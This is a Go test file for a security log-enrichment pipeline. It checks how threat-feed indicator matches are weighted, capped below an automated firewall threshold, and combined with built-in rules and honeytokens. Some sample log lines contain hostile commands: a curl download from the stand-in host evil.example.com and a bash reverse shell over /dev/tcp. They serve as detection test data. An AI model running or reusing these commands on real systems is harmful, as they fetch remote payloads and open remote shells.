package enrich

import (
	"path/filepath"
	"strings"
	"testing"

	"github.com/TheRealArron/sentinel-rag/ingestor/internal/event"
	"github.com/TheRealArron/sentinel-rag/ingestor/internal/ioc"
	"github.com/TheRealArron/sentinel-rag/ingestor/internal/parser"
	"github.com/TheRealArron/sentinel-rag/ingestor/internal/sanitize"
)

// iocFeed compiles a throwaway bundle for the given records.
func iocFeed(t *testing.T, recs []ioc.Record) *ioc.Feed {
	t.Helper()
	dir := t.TempDir()
	bloomPath := filepath.Join(dir, "ioc.bloom")
	storePath := filepath.Join(dir, "ioc.store")
	if err := ioc.Build(bloomPath, storePath, recs, ioc.DefaultFPR, 1, 3); err != nil {
		t.Fatalf("ioc.Build: %v", err)
	}
	feed, err := ioc.Load(bloomPath, storePath)
	if err != nil {
		t.Fatalf("ioc.Load: %v", err)
	}
	t.Cleanup(func() { feed.Close() })
	return feed
}

// enrichWith is enrichLine with detectors configured.
func enrichWith(t *testing.T, line string, det Detectors) *event.Event {
	t.Helper()
	san := sanitize.Line(line, 0)
	env := parser.Parse(san.Clean)
	ev := &event.Event{
		Host:    env.Host,
		Process: env.Process,
		PID:     env.PID,
		Message: env.Message,
	}
	ApplyWith(ev, env, san, det)
	return ev
}

const knownBadIP = "198.51.100.77"

func TestIOCAnnotatesAnOtherwiseUnremarkableLine(t *testing.T) {
	feed := iocFeed(t, []ioc.Record{
		{Indicator: knownBadIP, Type: ioc.TypeIP, Feed: "abuse.ch", Note: "cobalt strike C2"},
	})
	ev := enrichWith(t,
		"Aug  6 12:00:00 host kernel: [UFW ALLOW] OUT=eth0 DST="+knownBadIP+" DPT=443",
		Detectors{IOC: feed})

	if ev.Fields["ioc"] != knownBadIP {
		t.Fatalf("ioc field = %q, want %q", ev.Fields["ioc"], knownBadIP)
	}
	if ev.Fields["ioc_feed"] != "abuse.ch" {
		t.Errorf("ioc_feed = %q, want abuse.ch", ev.Fields["ioc_feed"])
	}
	if ev.Fields["ioc_note"] != "cobalt strike C2" {
		t.Errorf("ioc_note = %q", ev.Fields["ioc_note"])
	}
	if ev.Fields["score_ioc"] != "+25" {
		t.Errorf("score_ioc = %q, want +25 (an IP is the weakest indicator type)",
			ev.Fields["score_ioc"])
	}
	// Nothing built-in matched this line, so the feed hit is what makes it an
	// event at all.
	if ev.Rule != "ioc_match" {
		t.Errorf("rule = %q, want ioc_match", ev.Rule)
	}
	if !hasTag(ev, "threat-intel") || !hasTag(ev, "脅威インテリジェンス") {
		t.Errorf("tags = %v, want the bilingual threat-intel pair", ev.Tags)
	}
}

// A feed hit must not erase what a built-in rule concluded. "Failed SSH password
// from a known C2" is a materially better alert than either half alone.
func TestIOCKeepsTheBuiltinVerdict(t *testing.T) {
	feed := iocFeed(t, []ioc.Record{
		{Indicator: knownBadIP, Type: ioc.TypeIP, Feed: "internal"},
	})
	line := "Aug  6 12:00:00 host sshd[1]: Failed password for root from " + knownBadIP + " port 2222 ssh2"

	base := enrichWith(t, line, Detectors{})
	withIOC := enrichWith(t, line, Detectors{IOC: feed})

	if withIOC.Rule != base.Rule {
		t.Errorf("rule changed from %q to %q — the feed overwrote the built-in verdict",
			base.Rule, withIOC.Rule)
	}
	if withIOC.Category != base.Category {
		t.Errorf("category changed from %q to %q", base.Category, withIOC.Category)
	}
	if withIOC.Score <= base.Score {
		t.Errorf("score %d did not rise above the un-enriched %d", withIOC.Score, base.Score)
	}
	if withIOC.Fields["ioc"] == "" {
		t.Error("indicator not recorded on the event")
	}
}

// This is the invariant Phase 5 established: only a signal with no external
// dependency may reach the score that arms the firewall. A threat feed is
// external data, and a mistaken entry for a DNS resolver or CDN address is an
// ordinary occurrence — so however much evidence stacks up, a feed hit must stay
// below the responder's threshold.
//
// Note that critical *severity* is deliberately still reachable. Severity is a
// label for an analyst and starts at 80; the responder threshold is 90 and is
// the number that actuates. Capping the label instead would under-report a
// confirmed malware hash to a human in order to protect against a machine, which
// is the wrong trade in both directions.
func TestIOCCannotReachTheResponseThreshold(t *testing.T) {
	// The default SENTINEL_RESPONSE_MIN_SCORE in engine/sentinel/config.py. If
	// either number moves, this fails rather than silently arming the responder
	// from third-party data.
	const responseMinScore = 90
	if iocMaxScore >= responseMinScore {
		t.Fatalf("iocMaxScore %d has reached SENTINEL_RESPONSE_MIN_SCORE %d — "+
			"a feed hit can now trigger an automated firewall block",
			iocMaxScore, responseMinScore)
	}

	// A hash is the heaviest indicator, on top of the highest-scoring built-in
	// rule and every score-raising modifier available.
	sha := "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
	feed := iocFeed(t, []ioc.Record{
		{Indicator: sha, Type: ioc.TypeHash, Feed: "malware-bazaar"},
		{Indicator: knownBadIP, Type: ioc.TypeIP, Feed: "abuse.ch"},
		{Indicator: "evil.example.com", Type: ioc.TypeDomain, Feed: "internal"},
	})
	ev := enrichWith(t,
		"Aug  6 12:00:00 host sudo[1]: mallory : user NOT in sudoers ; TTY=pts/0 ; PWD=/ ; "+
			"USER=root ; COMMAND=/bin/curl http://evil.example.com/"+sha+" --interface "+knownBadIP,
		Detectors{IOC: feed})

	if ev.Score >= responseMinScore {
		t.Errorf("score %d reached the response threshold %d on feed data alone (fields: %v)",
			ev.Score, responseMinScore, ev.Fields)
	}
	// The cap must have been what stopped it, not a coincidence of the weights:
	// if this line ever stops saturating, the test is no longer proving anything.
	if ev.Fields["score_ioc_capped"] == "" {
		t.Errorf("this line scored %d without hitting the cap, so it no longer exercises it",
			ev.Score)
	}
}

// Three indicators on one line is normal for a connection log — source, target
// and hostname. Summing their weights would let an ordinary verbose message
// climb to the cap on nothing but repetition.
func TestIOCTakesTheMaximumWeightNotTheSum(t *testing.T) {
	feed := iocFeed(t, []ioc.Record{
		{Indicator: "198.51.100.1", Type: ioc.TypeIP, Feed: "f"},
		{Indicator: "198.51.100.2", Type: ioc.TypeIP, Feed: "f"},
		{Indicator: "198.51.100.3", Type: ioc.TypeIP, Feed: "f"},
	})
	ev := enrichWith(t,
		"Aug  6 12:00:00 host app[1]: relay 198.51.100.1 -> 198.51.100.2 via 198.51.100.3",
		Detectors{IOC: feed})

	if got := ev.Fields["score_ioc"]; got != "+25" {
		t.Errorf("score_ioc = %q, want +25 — three IP hits must not stack", got)
	}
	// All three are still reported: they are context, they just do not compound.
	for _, want := range []string{"198.51.100.1", "198.51.100.2", "198.51.100.3"} {
		if !strings.Contains(ev.Fields["ioc"], want) {
			t.Errorf("ioc field %q omits %s", ev.Fields["ioc"], want)
		}
	}
}

// A hash outweighs a domain, which outweighs an IP. When several types hit at
// once the strongest evidence sets the score.
func TestIOCWeightsByIndicatorStrength(t *testing.T) {
	sha := "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
	cases := []struct {
		name string
		recs []ioc.Record
		msg  string
		want string
	}{
		{"ip only", []ioc.Record{{Indicator: knownBadIP, Type: ioc.TypeIP, Feed: "f"}},
			"talking to " + knownBadIP, "+25"},
		{"domain only", []ioc.Record{{Indicator: "evil.example.com", Type: ioc.TypeDomain, Feed: "f"}},
			"resolving evil.example.com", "+35"},
		{"hash only", []ioc.Record{{Indicator: sha, Type: ioc.TypeHash, Feed: "f"}},
			"wrote file " + sha, "+45"},
		{"hash wins over ip", []ioc.Record{
			{Indicator: sha, Type: ioc.TypeHash, Feed: "f"},
			{Indicator: knownBadIP, Type: ioc.TypeIP, Feed: "f"},
		}, "downloaded " + sha + " from " + knownBadIP, "+45"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			ev := enrichWith(t, "Aug  6 12:00:00 host app[1]: "+tc.msg,
				Detectors{IOC: iocFeed(t, tc.recs)})
			if got := ev.Fields["score_ioc"]; got != tc.want {
				t.Errorf("score_ioc = %q, want %q", got, tc.want)
			}
		})
	}
}

// A honeytoken replaces the scoring model rather than adding to it, so an event
// that is both a canary reference and a feed hit must still land on exactly 100
// — not 100 plus an IOC weight, and not the IOC cap.
func TestHoneytokenStillWinsOverIOC(t *testing.T) {
	feed := iocFeed(t, []ioc.Record{
		{Indicator: knownBadIP, Type: ioc.TypeIP, Feed: "f"},
	})
	ev := enrichWith(t,
		"Aug  6 12:00:00 host sshd[1]: Failed password for admin_backup from "+knownBadIP+" port 22 ssh2",
		Detectors{IOC: feed, Honeytokens: honeySet(t)})

	if ev.Score != 100 {
		t.Errorf("score = %d, want 100", ev.Score)
	}
	if ev.Rule != "honeytoken_referenced" {
		t.Errorf("rule = %q, want honeytoken_referenced", ev.Rule)
	}
	// The indicator is still recorded — losing it would discard real context.
	if ev.Fields["ioc"] != knownBadIP {
		t.Errorf("ioc field = %q, want the indicator retained alongside the canary",
			ev.Fields["ioc"])
	}
}

// A nil feed, and a feed that matches nothing, must both leave the event exactly
// as the rest of the pipeline produced it.
func TestIOCIsInertWhenNothingMatches(t *testing.T) {
	line := "Aug  6 12:00:00 host sshd[1]: Accepted publickey for alice from 10.1.2.3 port 51234 ssh2"
	base := enrichWith(t, line, Detectors{})
	withFeed := enrichWith(t, line, Detectors{
		IOC: iocFeed(t, []ioc.Record{{Indicator: knownBadIP, Type: ioc.TypeIP, Feed: "f"}}),
	})
	if withFeed.Score != base.Score || withFeed.Rule != base.Rule {
		t.Errorf("a non-matching feed changed the verdict: %q/%d vs %q/%d",
			withFeed.Rule, withFeed.Score, base.Rule, base.Score)
	}
	if withFeed.Fields["ioc"] != "" {
		t.Errorf("ioc field set to %q with no match", withFeed.Fields["ioc"])
	}
}

func TestIOCDoesNotLowerAnAlreadyActionableScore(t *testing.T) {
	// The counterpart to the cap. Capping the *total* meant a feed hit dragged a
	// score-96 reverse shell down to 89 — below the responder's threshold — so
	// agreeing with a threat feed made the system act less decisively on its own
	// strongest detection. The cap constrains what a feed can add, not what the
	// host already concluded.
	feed := iocFeed(t, []ioc.Record{
		{Indicator: "evil.example.com", Type: ioc.TypeDomain, Feed: "internal"},
	})
	line := "Aug  6 12:00:00 host sudo[1]: arron : TTY=pts/0 ; PWD=/ ; USER=root ; " +
		"COMMAND=/bin/bash -i >& /dev/tcp/198.51.100.9/4444 0>&1 # evil.example.com"

	without := enrichWith(t, line, Detectors{})
	with := enrichWith(t, line, Detectors{IOC: feed})

	if without.Score < responseMinScore {
		t.Fatalf("precondition: the line should be actionable without any feed, got %d", without.Score)
	}
	if with.Score < without.Score {
		t.Errorf("a feed hit lowered the score from %d to %d", without.Score, with.Score)
	}
	if with.Fields["ioc"] == "" {
		t.Error("the indicator should still be recorded as context")
	}
}
